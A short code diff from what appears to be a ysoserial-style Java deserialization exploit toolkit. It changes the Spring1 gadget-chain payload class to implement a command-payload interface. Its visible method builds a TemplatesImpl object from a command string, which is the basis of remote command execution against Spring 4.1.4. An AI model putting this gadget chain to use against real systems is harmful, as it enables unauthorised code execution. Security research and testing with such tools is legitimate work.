@@ -11,7 +11,7 @@ import javax.xml.transform.Templates;
 import com.h2tg.ysogate.utils.PayloadRunner;
 import org.springframework.beans.factory.ObjectFactory;
 
-import com.h2tg.ysogate.payloads.ObjectPayload;
+import com.h2tg.ysogate.payloads.CommandObjectPayload;
 import com.h2tg.ysogate.annotation.Authors;
 import com.h2tg.ysogate.annotation.Dependencies;
 import com.h2tg.ysogate.utils.Gadgets;
@@ -50,7 +50,8 @@ import com.h2tg.ysogate.utils.Reflections;
 @SuppressWarnings({"rawtypes"})
 @Dependencies({"org.springframework:spring-core:4.1.4.RELEASE", "org.springframework:spring-beans:4.1.4.RELEASE"})
 @Authors({Authors.FROHOFF})
-public class Spring1 extends PayloadRunner implements ObjectPayload<Object> {
+public class Spring1 extends PayloadRunner implements CommandObjectPayload<Object>
+{
 
 	public Object getObject(final String command) throws Exception {
 		final Object templates = Gadgets.createTemplatesImpl(command);
